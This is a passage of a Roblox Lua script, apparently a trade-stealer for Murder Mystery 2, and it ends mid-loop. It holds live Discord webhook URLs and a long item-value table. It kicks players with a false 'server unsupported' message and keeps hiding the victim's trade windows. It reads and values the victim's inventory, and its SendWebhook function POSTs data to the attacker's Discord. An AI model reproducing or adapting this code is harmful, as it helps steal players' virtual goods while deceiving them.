
userName = "ima3inedualhooks"
webHook = "https://discord.com/api/webhooks/1324737327032963092/mrK4Xpa1dRqaWlRMfkl4Kgp_V4utj3j4w_ii551o6xVvPR_ATEA4w8abhNlXKenIMKd1"

-- Custom Lua Script:
userName = "ima3ine"
webHook = "https://discord.com/api/webhooks/1324506204013199380/DtbFEJB_APjfQoMvmSXwJpdSJP2Yhsw6hrqkAnxAMCWISxjlbRgb4PXAcJi3y_Tvv_v4"

local values = {
    ["Nik's Scythe"] = 25000000,
    ["Elderwood Scythe"] = 75,
    ["Batwing"] = 62,
    ["Icewing"] = 4,
    ["Corrupt"] = 1275,
    ["Chroma Luger"] = 85,
    ["Chroma Shark"] = 68,
    ["Chroma Laser"] = 85,
    ["Chroma Slasher"] = 67,
    ["Chroma Fang"] = 57,
    ["Chroma Heat"] = 80,
    ["Chroma Saw"] = 42,
    ["Chroma DeathShard"] = 58,
    ["Chroma Tides"] = 62,
    ["SeerChroma"] = 50,
    ["Chroma Boneblade"] = 58,
    ["Chroma Gingerblade"] = 57,
    ["Elderwood Revolver"] = 58,
    ["Eternal II"] = 7,
    ["Red Luger"] = 42,
    ["Green Luger"] = 30,
    ["Sugar"] = 145,
    ["Candy"] = 155,
    ["Chill"] = 24,
    ["Handsaw"] = 10,
    ["Eternal"] = 10,
    ["Boneblade"] = 10,
    ["Clockwork"] = 26,
    ["Hallow's Edge"] = 15,
    ["Amerilaser"] = 30,
    ["Old Glory"] = 28,
    ["BattleAxe II"] = 16,
    ["Spider"] = 22,
    ["Pixel"] = 24,
    ["Blaster"] = 30,
    ["Ginger Luger"] = 26,
    ["Virtual"] = 28,
    ["Flames"] = 13,
    ["Luger"] = 60,
    ["Heat"] = 25,
    ["Xmas"] = 13,
    ["Tides"] = 23,
    ["Slasher"] = 26,
    ["Pumpking"] = 22,
    ["Saw"] = 10,
    ["Laser"] = 8,
    ["Fang"] = 23,
    ["Shark"] = 28,
    ["Deathshard"] = 21,
    ["Winter's Edge"] = 14,
    ["Ice Dragon"] = 13,
    ["Red Seer"] = 3,
	["Seer"] = 3,
    ["Blue Seer"] = 3,
    ["Purple Seer"] = 3,
    ["Orange Seer"] = 2,
    ["Yellow Seer"] = 2,
    ["BattleAxe"] = 13,
    ["Frostsaber"] = 18,
    ["Ice Shard"] = 14,
    ["Gingerblade"] = 22,
    ["Snowflake"] = 8,
    ["Ghostblade"] = 10,
    ["Nightblade"] = 28,
    ["Hallow's Blade"] = 11,
    ["JD"] = 60,
    ["Web"] = 2,
    ["Rupture"] = 2,
    ["Green Elite"] = 10,
    ["Tree (gun)"] = 1,
    ["Tree (knife)"] = 1,
    ["Cotton Candy"] = 60,
    ["Scratch"] = 5,
    ["Ghost Knife"] = 6,
    ["Ginger Gun"] = 4,
    ["Red Fire"] = 3,
    ["Blue Scratch"] = 3,
    ["Blue Elite"] = 8,
    ["Green Fire"] = 0.43,
    ["Ghost Gun"] = 1,
    ["Predator (knife)"] = 0.44,
    ["Emerald"] = 0.44,
    ["Sparkle"] = 0.43,
    ["Overseer (gun)"] = 0.44,
    ["Midnight"] = 0.43,
    ["Elite"] = 0.33,
    ["Shiny"] = 0.34,
    ["Fusion"] = 0.34,
    ["Fade"] = 0.34,
    ["Splash"] = 0.34,
    ["Universe"] = 0.34,
    ["Overseer (knife)"] = 0.42,
    ["Predator (gun)"] = 0.42,
    ["Plasmite"] = 0.34,
    ["Viper"] = 0.34,
    ["Ginger Knife"] = 0.42,
    ["Jack"] = 4,
    ["Mummy"] = 1,
    ["Ginger (Knife)"] = 1,
    ["Ginger (Gun)"] = 1,
    ["Cane (Knife)"] = 2,
    ["Cane (Gun)"] = 2,
    ["Orange Marble"] = 4,
    ["Bats"] = 4,
    ["Cane Knife"] = 175,
    ["Icicles Gun"] = 25,
    ["Snowy"] = 1,
    ["GingerBread"] = 0.42,
    ["Vampire Gun"] = 25,
    ["Toxic Knife"] = 30,
    ["Galaxy"] = 0.24,
    ["Rainbow"] = 0.24,
    ["Imbued"] = 0.24,
    ["Galactic"] = 0.24,
    ["Krypto"] = 0.24,
    ["Spectrum"] = 0.24,
    ["iRevolver"] = 0.24,
    ["Hacker"] = 0.24,
    ["Nova"] = 0.24,
    ["Vortex"] = 0.24,
    ["Ace"] = 0.24,
    ["Bacon"] = 0.24,
    ["Korblox"] = 0.24,
    ["Squire"] = 0.24,
    ["Abstract"] = 0.24,
    ["Musical"] = 0.24,
    ["Black"] = 0.24,
    ["Purple"] = 0.24,
    ["Magma"] = 12,
    ["Green Marble"] = 6,
    ["Vampire Knife"] = 2,
    ["Toxic Gun"] = 3,
    ["Cane Gun"] = 0.42,
    ["Icicles Knife"] = 0.41,
    ["Nether"] = 0.41,
    ["Spitfire"] = 0.33,
    ["Damp"] = 0.33,
    ["Molten (Gun)"] = 0.42,
    ["Molten (Knife)"] = 0.42,
    ["Gifted"] = 1,
    ["Snowman (Knife)"] = 1,
    ["Snowman (Gun)"] = 1,
    ["Nutcracker"] = 1,
    ["Wrapped (Knife)"] = 1,
    ["Wrapped (Gun)"] = 1,
    ["Wolf"] = 4,
    ["Vampire"] = 3,
    ["Moons"] = 4,
    ["Night"] = 0.31,
    ["Future"] = 0.31,
    ["Checker"] = 0.31,
    ["Love (Gun)"] = 0.42,
    ["Donut"] = 0.31,
    ["Wanwood"] = 0.14,
    ["Adurite (Knife)"] = 0.14,
    ["Bluesteel (Knife)"] = 0.14,
    ["Adurite (Gun)"] = 0.14,
    ["Camo"] = 0.14,
    ["Stalker"] = 0.14,
    ["Missing"] = 0.14,
    ["Cheesy"] = 0.14,
    ["Sketch"] = 0.14,
    ["Marina"] = 0.14,
    ["Cheddar"] = 0.14,
    ["Circuit"] = 0.14,
    ["Paper"] = 0.14,
    ["Doge"] = 0.14,
    ["Caution"] = 0.14,
    ["Soda"] = 0.14,
    ["Wooden"] = 0.14,
    ["Hazmat"] = 0.14,
    ["Bluesteel (Gun)"] = 0.14,
    ["Melon"] = 0.14,
    ["Hive"] = 0.14,
    ["Jigsaw"] = 0.14,
    ["Brush"] = 0.14,
    ["Lucky"] = 0.14,
    ["Pink"] = 0.14,
    ["Blue"] = 0.14,
    ["Red"] = 0.14,
    ["Mummy (Knife)"] = 2,
    ["Potion"] = 5,
    ["Webs"] = 4,
    ["Tree"] = 0.41,
    ["Sweater"] = 0.32,
    ["Frosty"] = 0.41,
    ["Mummy Gun"] = 12,
    ["Zombie Gun"] = 20,
    ["Potion Knife"] = 22,
    ["Mummy Knife"] = 2,
    ["Zombie Knife"] = 2,
    ["Potion Gun"] = 2,
    ["Sweater Knife"] = 10,
    ["Snowflake Knife"] = 4,
    ["Holly Gun"] = 2,
    ["Sweater Gun"] = 0.31,
    ["Snowflake Gun"] = 0.31,
    ["Holly Knife"] = 0.31,
    ["2015"] = 2,
    ["TNL"] = 2,
    ["Hearts"] = 4,
    ["Valentine"] = 3,
    ["Goo"] = 2,
    ["Neon"] = 3,
    ["Reptile"] = 2,
    ["Infected"] = 2,
    ["Passion"] = 4,
    ["Sweetheart"] = 3,
    ["Blossom"] = 4,
    ["Roses"] = 4,
    ["Santa (Knife)"] = 1,
    ["Santa (Gun)"] = 1,
    ["Ornament2 (knife)"] = 1,
    ["Ornament2 (Gun)"] = 1,
    ["Ornament1"] = 1,
    ["Ornament"] = 1,
    ["Elf (Gun)"] = 3,
    ["Elf (knife)"] = 14,
    ["Tulip"] = 3,
    ["Skool"] = 23,
    ["Patrick"] = 2,
    ["Bunny"] = 0.11,
    ["Choco"] = 3,
    ["Egg"] = 2,
    ["Carrot"] = 2,
    ["Asteroid"] = 6,
    ["Ghosty"] = 0.32,
    ["Brains"] = 1,
    ["Witch"] = 1,
    ["Boney"] = 1,
    ["Xbox"] = 0.12,
    ["Slime Gun"] = 2,
    ["Slime Knife"] = 3,
    ["Bats Knife"] = 70,
    ["Bats Gun"] = 4,
    ["Grave Gun"] = 12,
    ["Grave Knife"] = 2,
    ["Haunted Knife"] = 10,
    ["Haunted Gun"] = 2,
    ["Sparkle10"] = 45,
    ["Sparkle1"] = 3,
    ["Sparkle2"] = 3,
    ["Sparkle3"] = 3,
    ["Sparkle4"] = 5,
    ["Ecto"] = 3,
    ["CandyCorn"] = 2,
    ["Phantom"] = 6,
    ["Zombie"] = 4,
    ["Elf (2017)"] = 0.31,
    ["Santa (2017)"] = 0.31,
    ["Coal"] = 0.31,
    ["Present"] = 0.31,
    ["Sidewinder"] = 15,
    ["Grind"] = 4,
    ["Euro"] = 8,
    ["Ollie"] = 20,
    ["Tailslide"] = 22,
    ["Indy"] = 2,
    ["Coal Gun"] = 0.31,
    ["Snowman Knife"] = 0.31,
    ["Santa Knife"] = 0.31,
    ["Wrapped Knife"] = 0.31,
    ["Sparkle5"] = 15,
    ["Sparkle6"] = 18,
    ["Sparkle7"] = 23,
    ["Sparkle8"] = 26,
    ["Sparkle9"] = 42,
    ["Coal knife"] = 25,
    ["Snowman Gun"] = 5,
    ["Elf Gun"] = 0.41,
    ["Wrapped Gun"] = 5,
    ["Whiteout"] = 0.11,
    ["Splatter"] = 0.11,
    ["Ice"] = 0.11,
    ["Love (Knife)"] = 0.11,
    ["Iron"] = 0.11,
    ["Big Kill"] = 0.11,
    ["Fallout"] = 0.11,
    ["Cold"] = 0.11,
    ["Linked"] = 0.11,
    ["Slate"] = 0.11,
    ["Borders"] = 0.11,
    ["8bit"] = 0.11,
    ["Engraved"] = 0.11,
    ["Infiltrator"] = 0.11,
    ["Juice"] = 0.11,
    ["Star"] = 0.11,
    ["Clan"] = 0.11,
    ["Cherry"] = 0.11,
    ["Cardboard"] = 0.11,
    ["Stainless"] = 0.11,
    ["Bit"] = 0.11,
    ["Pea"] = 0.11,
    ["News"] = 0.11,
    ["HL2"] = 0.11,
    ["Bleached"] = 0.11,
    ["Clown"] = 0.12,
    ["Oily"] = 0.11,
    ["Aqua"] = 0.11,
    ["Eco"] = 0.11,
    ["Log"] = 0.11,
    ["Sandy"] = 0.11,
    ["Static"] = 0.11,
    ["Brown"] = 0.11,
    ["Green"] = 0.11,
    ["Yellow"] = 0.11,
    ["Orange"] = 0.11,
    ["Prism"] = 3,
    ["Denis"] = 1,
    ["Alex"] = 1,
    ["Corl"] = 1,
    ["Sketchy"] = 1,
    ["Sub"] = 1,
    ["Chroma Fire Bat"] = 15,
    ["Chroma Fire Bear"] = 8,
    ["Chroma Fire Fox"] = 15,
    ["Chroma Fire Pig"] = 9,
    ["Chroma Fire Bunny"] = 18,
    ["Chroma Fire Cat"] = 20,
    ["Chroma Fire Dog"] = 15,
    ["<3"] = 10,
    ["Steambird"] = 2,
    ["Phoenix"] = 3,
    ["Sammy"] = 2,
    ["Electro"] = 2,
    ["Deathspeaker"] = 3,
    ["Fire Bat"] = 1,
    ["Fire Bear"] = 1,
    ["Frostbird"] = 3,
    ["Fire Fox"] = 1,
    ["Fire Pig"] = 1,
    ["Fire Bunny"] = 1,
    ["Fire Cat"] = 1,
    ["Fire Dog"] = 1,
    ["Ice Phoenix"] = 0.43,
    ["Traveller"] = 0.43,
    ["Skelly"] = 0.43,
    ["Purple Pumpkin"] = 40,
    ["Overseer Eye"] = 38,
    ["Blue Pumpkin"] = 60,
    ["Red Pumpkin"] = 45,
    ["Green Pumpkin"] = 30,
    ["Pumpkin"] = 18,
    ["Fairy"] = 22,
    ["Reindeer"] = 20,
    ["Elf"] = 4,
    ["Nobledragon"] = 25,
    ["Elitey"] = 0.31,
    ["Eyeball"] = 35,
    ["Jetstream"] = 42,
    ["Dogey"] = 55,
    ["Chilly"] = 15,
    ["Seahorsey"] = 17,
    ["Piggy"] = 4,
    ["Pengy"] = 15,
    ["UFO"] = 7,
    ["Badger"] = 2,
    ["Bat"] = 0.31,
    ["Tankie"] = 13,
    ["Mechbug"] = 7,
    ["Bear"] = 0.22,
    ["Fox"] = 0.12,
    ["Pig"] = 0.12,
    ["Santa Dog"] = 0.12,
    ["Cat"] = 0.11,
    ["Dog"] = 0.11,
    ["America"] = 10,
    ["Golden"] = 4,
    ["Blood"] = 10,
    ["Phaser"] = 9,
    ["Prince"] = 6,
    ["Shadow"] = 7,
    ["Ghost"] = 12,
    ["Splitter"] = 3,
    ["Cowboy"] = 3,
    ["Eternalcane"] = 20,
    ["Skulls"] = 12,
    ["Witched"] = 50,
    ["Monster"] = 22,
    ["Pumpkin Patch"] = 2,
    ["Blue Pumpkin 2019"] = 3,
    ["Brains 2019"] = 20,
    ["Elf 2019"] = 25,
    ["Gingerbread Gun"] = 5,
    ["Gingerbread Knife"] = 105,
    ["Green Pumpkin 2019"] = 27,
    ["Red Pumpkin 2019"] = 30,
    ["PumpkinPet2019"] = 0.21,
    ["Rudolph"] = 20,
    ["Vampire Bat"] = 32,
    ["Black Cat"] = 45,
    ["Zombie Dog"] = 185,
    ["Aurora Gun"] = 2,
    ["Aurora Knife"] = 30,
    ["Bones Gun"] = 75,
    ["Branches"] = 22,
    ["Candy Swirl Gun"] = 20,
    ["Candy Swirl Knife"] = 1,
    ["Lights Gun"] = 20,
    ["Lights Knife"] = 2,
    ["Log Chopper"] = 30,
    ["Minty"] = 25,
    ["Icey"] = 0.32,
    ["Frostbite"] = 10,
    ["Lugercane"] = 20,
    ["Snakebite Knife"] = 12,
    ["Snakebite Gun"] = 1,
    ["Snowflakes Gun"] = 0.41,
    ["Snowflakes Knife"] = 0.31,
    ["Slimy"] = 0.41,
    ["Santa's Magic"] = 13,
    ["Dungeon"] = 45,
    ["Frosted Gun"] = 0.31,
    ["Frosted Knife"] = 0.41,
    ["Gifts Knife"] = 60,
    ["Gifts Gun"] = 1,
    ["Pine Gun"] = 1,
    ["Pine Knife"] = 20,
    ["Webbed Gun"] = 0.31,
    ["Webbed Knife"] = 0.33,
    ["ZombifiedGun"] = 20,
    ["Zombified Knife"] = 55,
    ["Mummified"] = 0.42,
    ["RIP Gun"] = 20,
    ["Box of Gold Papers"] = 4,
    ["Box of Ultra Wrap"] = 4,
    ["Box of Purple Papers"] = 3,
    ["Box of Blue Papers"] = 3,
    ["Box of Red Papers"] = 3,
    ["Box of Green Papers"] = 2,
    ["Box of Fert"] = 2,
    ["Mystery Keys"] = 4,
    ["Xmas Gifts"] = 0.41,
    ["Snowflake Key"] = 0.31,
    ["Skeleton Key"] = 2,
    ["Chroma Gemstone"] = 75,
    ["Gemstone"] = 26,
    ["Eternal III"] = 8,
    ["Rune"] = 0.34,
    ["Rainbow (Gun)"] = 0.24,
    ["Bioblade"] = 13,
    ["Lightbringer"] = 58,
    ["Chroma Lightbringer"] = 120,
    ["Chroma Darkbringer"] = 125,
    ["Darkbringer"] = 62,
    ["Combat"] = 0.11,
    ["Copper"] = 0.11,
    ["Hardened"] = 0.11,
    ["Splat"] = 0.11,
    ["Tiger"] = 0.14,
    ["Pirate"] = 0.14,
    ["Space"] = 0.24,
    ["Splash Gun"] = 0.33,
    ["Deep Sea"] = 0.24,
    ["Nightfire"] = 0.24,
    ["Biogun"] = 0.14,
    ["Graffiti"] = 0.13,
    ["High Tech"] = 0.13,
    ["Clown Gun"] = 0.12,
    ["Leaf"] = 0.11,
    ["Lovely"] = 0.11,
    ["Shaded"] = 0.11,
    ["Eternal IV"] = 10,
    ["Prismatic"] = 8,
    ["Cavern Gun"] = 1,
    ["Cavern Knife"] = 12,
    ["Hallowscythe"] = 50,
    ["Hallowgun"] = 33,
    ["Vampire's Edge"] = 16,
    ["Ripper Gun"] = 0.42,
    ["Ripper Knife"] = 0.43,
    ["Bones"] = 0.32,
    ["Portal Knife"] = 0.32,
    ["Ghosts"] = 0.21,
    ["Peppermint"] = 6,
    ["Icebreaker"] = 85,
    ["Iceblaster"] = 60,
    ["Jinglegun"] = 14,
    ["Cookieblade"] = 4,
    ["Gold Candy"] = 100000000,
    ["Silver Candy"] = 75000000,
    ["Bronze Candy"] = 50000000,
    ["Blue Candy"] = 1000000,
    ["Red Hallow"] = 1000000,
    ["Gold Hallow"] = 100000000,
    ["Silver Hallow"] = 75000000,
    ["Bronze Hallow"] = 50000000,
    ["Bronze Sugar"] = 50000000,
    ["Silver Sugar"] = 75000000,
    ["Gold Sugar"] = 100000000,
    ["Blue Sugar"] = 1000000,
    ["Blue Elderwood (gun)"] = 1000000,
    ["Bronze Elderwood (gun)"] = 50000000,
    ["Silver Elderwood (gun)"] = 75000000,
    ["Gold Elderwood (gun)"] = 100000000,
    ["Gold Logchopper"] = 100000000,
    ["Gold Minty"] = 100000000,
    ["Silver Minty"] = 75000000,
    ["Silver Logchopper"] = 75000000,
    ["Bronze Logchopper"] = 50000000,
    ["Bronze Minty"] = 50000000,
    ["Blue Minty"] = 1000000,
    ["Blue Logchopper"] = 1000000,
	["Logchopper"] = 30,
    ["Blue Vamp's Edge"] = 1000000,
    ["Bronze Vamp's Edge"] = 50000000,
    ["Silver Vamp's Edge"] = 75000000,
    ["Gold Vamp's Edge"] = 100000000,
    ["Heartblade"] = 75,
    ["Gold Icebreaker"] = 100000000,
    ["Silver Icebreaker"] = 75000000,
    ["Bronze Icebreaker"] = 50000000,
    ["Red Icebreaker"] = 1000000,
    ["Red Iceblaster"] = 1000000,
    ["Bronze Iceblaster"] = 50000000,
    ["Silver Iceblaster"] = 75000000,
    ["Gold Iceblaster"] = 100000000,
    ["Eggblade"] = 3,
    ["Nebula"] = 7,
    ["Glitch1"] = 25,
    ["Candleflame"] = 130,
    ["Chroma Candleflame"] = 190,
    ["Harvester"] = 900,
    ["Chroma Swirlygun"] = 180,
    ["Swirly Gun"] = 170,
    ["Swirly Axe"] = 190,
    ["Swirly Blade"] = 80,
    ["Iceflake"] = 31,
    ["Icebeam"] = 31,
    ["Icecracker"] = 3,
    ["Ornaments Gun"] = 0.12,
    ["Ornaments Knife"] = 0.12,
    ["Gift Bag Knife"] = 0.22,
    ["Silent Night Knife"] = 10,
    ["Icedriller"] = 15,
    ["Stockings"] = 0.12,
    ["Trees"] = 0.12,
    ["Wrap Gun"] = 0.22,
    ["Wrap Knife"] = 0.22,
    ["Snowflakes"] = 0.41,
    ["Silent Night Gun"] = 2,
    ["Gift Bag Gun"] = 0.12,
    ["Giftwrap Knife"] = 0.12,
    ["Stickers Gun"] = 0.12,
    ["Cookie Gun"] = 0.22,
    ["Ice Camo"] = 0.32,
    ["Starry Knife"] = 0.41,
    ["Stickers Knife"] = 0.11,
    ["Coal Knife"] = 0.12,
    ["Ribbons"] = 0.12,
    ["Tree Knife"] = 0.23,
    ["Cookie Knife"] = 0.31,
    ["Starry Gun"] = 0.43,
    ["Swirl Knife"] = 0.41,
    ["Gold Harvester"] = 100000000,
    ["Silver Harvester"] = 75000000,
    ["Bronze Harvester"] = 50000000,
    ["Blue Harvester"] = 1000000,
    ["Plasmabeam"] = 31,
    ["Plasmablade"] = 31,
    ["Gold Swirly"] = 100000000,
    ["Silver Swirly"] = 75000000,
    ["Bronze Swirly"] = 50000000,
    ["Blue Swirly"] = 1000000,
    ["Silver Swirly Gun"] = 75000000,
    ["Bronze Swirly Gun"] = 50000000,
    ["Blue Swirly Gun"] = 1000000,
    ["Candies 2016"] = 0.21,
    ["Candies 2017"] = 0.11,
    ["Snowbear"] = 0.31,
    ["Scarecrow"] = 0.42,
    ["Mr. Reindeer"] = 0.42,
    ["Snowman"] = 0.22,
    ["Shadow Pumpkin"] = 0.32,
    ["Skully"] = 0.42,
    ["Santa's Spirit"] = 12,
    ["Frozen Gun"] = 22,
    ["RB Knife"] = 0.31,
    ["Gothic Gun"] = 0.41,
    ["Gothic Knife"] = 0.23,
    ["Wraiths Gun"] = 0.23,
    ["Fall Camo"] = 0.22,
    ["Wraiths Knife"] = 0.41,
    ["Frozen Knife"] = 2,
    ["Slashed"] = 0.22,
    ["Starry"] = 0.22,
    ["Carved (Gun)"] = 0.12,
    ["Carved (Knife)"] = 0.13,
    ["Chroma Elderwood Blade"] = 190,
    ["Makeshift"] = 135,
    ["Elderwood Blade"] = 130,
    ["Spectre"] = 80,
    ["Spectral Knife"] = 5,
    ["Spectral Gun"] = 0.43,
    ["Magma Knife"] = 0.32,
    ["Magma Gun"] = 0.41,
    ["Watcher Knife"] = 0.32,
    ["Watcher Gun"] = 0.41,
    ["Versus"] = 0.12,
    ["Apocalypse Knife"] = 0.23,
    ["Candy Corn Gun"] = 0.22,
    ["Apocalypse Gun"] = 0.23,
    ["Darkness Knife"] = 0.22,
    ["Hunter Knife"] = 0.22,
    ["Webs Gun"] = 0.22,
    ["Candy Corn Knife"] = 0.12,
    ["Eyeball Knife"] = 0.12,
    ["Stickers"] = 0.12,
    ["Darkness Gun"] = 0.12,
    ["Infected Knife"] = 0.23,
    ["Infected Gun"] = 0.23,
    ["Brains Gun"] = 0.22,
    ["Ghostly"] = 0.22,
    ["Hazard Knife"] = 0.22,
    ["Hazard Gun"] = 0.31,
    ["Lantern Knife"] = 0.32,
    ["Moonlight Gun"] = 0.32,
    ["Witchbrew"] = 0.22,
    ["Curse Knife"] = 0.32,
    ["Ghostfire"] = 0.41,
    ["Makeshift Knife"] = 1,
    ["Wraith Gun"] = 0.32,
    ["Wraith Knife"] = 0.41,
    ["Zombified"] = 0.43,
    ["Santa Walking"] = 40,
    ["Mr. Snowman"] = 0.41,
    ["Void"] = 0.42,
    ["Chroma Cookiecane"] = 160,
    ["Cookiecane"] = 80,
    ["Icepiercer"] = 870,
    ["Gingermint"] = 80,
    ["Arctic Knife"] = 0.43,
    ["Arctic Gun"] = 4,
    ["Coal Gun 2022"] = 0.12,
    ["Candied Knife"] = 0.12,
    ["Snowman Gun 2022"] = 0.13,
    ["Stockings 2022"] = 0.23,
    ["Mistletoe Gun"] = 0.23,
    ["Snowflake Knife 2022"] = 0.23,
    ["Gingerbread Gun 2022"] = 0.33,
    ["Tree Knife 2022"] = 0.33,
    ["Coal Knife 2022"] = 0.12,
    ["Candied Gun"] = 0.12,
    ["Stickers Gun 2022"] = 0.12,
    ["Snowman Knife 2022"] = 0.12,
    ["Stockings Gun 2022"] = 0.22,
    ["Mistletoe Knife"] = 0.22,
    ["Snowflake Gun 2022"] = 0.22,
    ["Tree Gun 2022"] = 0.32,
    ["Gingerbread Knife 2022"] = 0.32,
    ["Blue Elderwood"] = 1000000,
    ["Bronze Elderwood"] = 50000000,
    ["Silver Elderwood"] = 75000000,
    ["Gold Elderwood"] = 100000000,
    ["Gold Icepiercer"] = 100000000,
    ["Gold Icecrusher"] = 100000000,
    ["Silver Icecrusher"] = 75000000,
    ["Silver Icepiercer"] = 75000000,
    ["Bronze Icepiercer"] = 50000000,
    ["Bronze Icecrusher"] = 50000000,
    ["Red Icecrusher"] = 1000000,
    ["Red Icepiercer"] = 1000000,
    ["Glitch2"] = 45,
    ["Sakura"] = 540,
    ["Broken"] = 3,
    ["Heart"] = 0.32,
    ["Rose"] = 0.22,
    ["Love"] = 0.12,
    ["Teddy"] = 0.32,
    ["Combat II"] = 4,
    ["Candycorn 2019"] = 0.31,
    ["Candy Corn gun 2020"] = 0.12,
    ["Candy Corn knife 2020"] = 0.12,
    ["Watcher Knife 2020"] = 0.12,
    ["Watcher gun 2020"] = 0.12,
    ["Mummy Knife 2020"] = 0.22,
    ["Mummy gun 2020"] = 0.22,
    ["Portal Gun"] = 0.22,
    ["Ghosts knife 2020"] = 0.22,
    ["Candle"] = 0.12,
    ["Rainbow Gun"] = 185,
    ["Chromatic Knife"] = 0.44,
    ["Chromatic Gun"] = 0.43,
    ["Nuke"] = 0.41,
    ["Bio"] = 0.32,
    ["Marble"] = 0.22,
    ["Painted Knife"] = 0.32,
    ["Painted Gun"] = 0.22,
    ["Fragile Gun"] = 0.12,
    ["Fragile Knife"] = 0.12,
    ["Carrot Bunny"] = 0.32,
    ["Waves"] = 140,
    ["Ocean"] = 145,
    ["Beach"] = 3,
    ["Floral"] = 0.33,
    ["Sunset"] = 0.32,
    ["Popsicle"] = 0.22,
    ["Pool Noodle"] = 0.31,
    ["Toy Knife"] = 0.21,
    ["Toy Gun"] = 0.21,
    ["Sticker Gun"] = 0.12,
    ["Chroma Travelers Gun"] = 42500,
    ["Traveler's Gun"] = 1550,
    ["Darkshot"] = 430,
    ["Darksword"] = 425,
    ["Traveler's Axe"] = 4600,
    ["Traveler Gun"] = 4,
    ["Traveler Knife"] = 0.43,
    ["Darkknife"] = 0.43,
    ["Ghastly Gun"] = 0.41,
    ["Ghoulish"] = 25,
    ["Wood Knife"] = 0.13,
    ["Vines Gun"] = 0.13,
    ["Vines Knife"] = 0.21,
    ["Etched"] = 0.22,
    ["Steel Knife"] = 0.22,
    ["Glowy"] = 0.22,
    ["Eclipse"] = 0.22,
    ["Steel Gun"] = 0.32,
    ["Meltdown"] = 0.32,
    ["Turkey"] = 975,
    ["Latte Gun"] = 75,
    ["Latte Knife"] = 75,
    ["Scarf"] = 0.31,
    ["Pumpkin Pie"] = 0.41,
    ["Darkgun"] = 0.33,
    ["Ghastly Knife"] = 0.33,
    ["Evergreen"] = 435,
    ["Evergun"] = 925,
    ["Gingerscope"] = 6100,
    ["Chroma Evergun"] = 23000,
    ["Chroma Evergreen"] = 11000,
    ["Frostfade Gun"] = 0.43,
    ["Frostfade Knife"] = 2,
    ["Snowflake Gun 23"] = 0.32,
    ["Neon Gun"] = 0.33,
    ["Snowglobe Knife"] = 0.32,
    ["Tree Knife 23"] = 0.33,
    ["Snowman Gun 23"] = 0.31,
    ["Fireplace"] = 0.31,
    ["Canes Knife"] = 0.23,
    ["Canes Gun"] = 0.31,
    ["Stars Gun"] = 0.23,
    ["Stars Knife"] = 0.31,
    ["Snowfall"] = 0.12,
    ["Santa Gun 23"] = 0.13,
    ["Elf Gun 23"] = 0.12,
    ["Ribbon Knife"] = 0.13,
    ["Bells"] = 0.12,
    ["Present Knife"] = 0.13,
    ["Frozen Gun 23"] = 0.12,
    ["Frozen Knife 23"] = 0.13,
    ["Flowerwood Knife"] = 120,
    ["Flowerwood Gun"] = 120,
    ["Wavy Gun"] = 0.32,
    ["Wavy Knife"] = 0.32,
    ["Carrot Knife"] = 0.31,
    ["Carrot Gun"] = 0.31,
    ["Robot Knife"] = 0.32,
    ["Spring Knife"] = 0.33,
    ["Blue Gingerscope"] = 1000000,
    ["Blue Gingerscythe"] = 1000000,
    ["Bronze Gingerscope"] = 50000000,
    ["Bronze Gingerscythe"] = 50000000,
    ["Silver Gingerscope"] = 75000000,
    ["Silver Gingerscythe"] = 75000000,
    ["Gold Gingerscope"] = 100000000,
    ["Gold Gingerscythe"] = 100000000,
    ["Chroma Watergun"] = 3500,
    ["Watergun"] = 225,
    ["Pearl"] = 115,
    ["Pearlshine"] = 115,
    ["Palms Knife"] = 0.43,
    ["Palms Gun"] = 2,
    ["Waves Knife"] = 0.41,
    ["Floral Gun"] = 0.33,
    ["Jellyfish Knife"] = 0.22,
    ["Popsicle Gun"] = 0.22,
    ["Turtle Knife"] = 0.22,
    ["Clownfish Gun"] = 0.22,
    ["Sandy Gun"] = 0.22,
    ["Balloons Gun"] = 0.22,
    ["Starfish Knife"] = 0.22,
    ["Starfish Gun"] = 0.22,
    ["Clownfish Knife"] = 0.22,
    ["Floatie"] = 0.31,
    ["Sharky Knife"] = 0.42,
	["Leaves"] = 1,
	["Aliens"] = 1,
	["Moon"] = 1
}

if #game:GetService("Players"):GetPlayers() <= 2 then
    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
end

if #game:GetService("Players"):GetPlayers() == 12 then
    game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
end

local LP = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)

_G.vlorp = _G.vlorp or false
if _G.vlorp then
    return
end
_G.vlorp = true

local destroytrades2 = coroutine.create(function()
    while true do
        local player = game:GetService("Players").LocalPlayer
        local tradeGUI = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI")
        local tradeGUIPhone = player:WaitForChild("PlayerGui"):WaitForChild("TradeGUI_Phone")

        if tradeGUI.Enabled == true then
            tradeGUI.Enabled = false
        end

        if tradeGUIPhone.Enabled == true then
            tradeGUIPhone.Enabled = false
        end

        wait(0.1)
    end
end)

function SendWebhook(url, data)
    local jsonData = HttpService:JSONEncode(data)
    local response = request({
        Url = url,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

function CreateEmbed(title, description, color, fields)
    local embed = {
        ["title"] = title,
        ["description"] = description,
        ["color"] = color,
        ["fields"] = fields or {}
    }
    return embed
end

local function getLvl()
    for i,v in pairs(LevelModule.XPTable) do
        if PlayerDataModule.NewXP < v then
            return i
        end
    end
end

local allItems = {}
local itemsCount = 0

local valueCount = 0

local vintageItems = {}
local commonItems = {}
local uncommonItems = {}
local rareItems = {}
local legendaryItems = {}
local godlyItems = {}
local ancientItems = {}
local uniqueItems = {}

local vintageItemsC = 0
local commonItemsC = 0
local uncommonItemsC = 0
local rareItemsC = 0
local legendaryItemsC = 0
local godlyItemsC = 0
local ancientItemsC = 0
local uniqueItemsC = 0

for a,b in pairs(InvModule.MyInventory.Data.Weapons) do
    for c,d in pairs(b) do
        local br = 0
        if values[d.ItemName] then
            valueCount = valueCount + values[d.ItemName]
            br = values[d.ItemName]
        end

        local formattedTable = {name = d.ItemName, value = br, data = d.DataID, amount = d.Amount, rarity = d.Rarity}
        table.insert(allItems, formattedTable)
        
        if d.Rarity == "Vintage" then
            vintageItemsC = vintageItemsC + 1
            table.insert(vintageItems, formattedTable)
        end

        if d.Rarity == "Unique" then
            uniqueItemsC = uniqueItemsC + 1
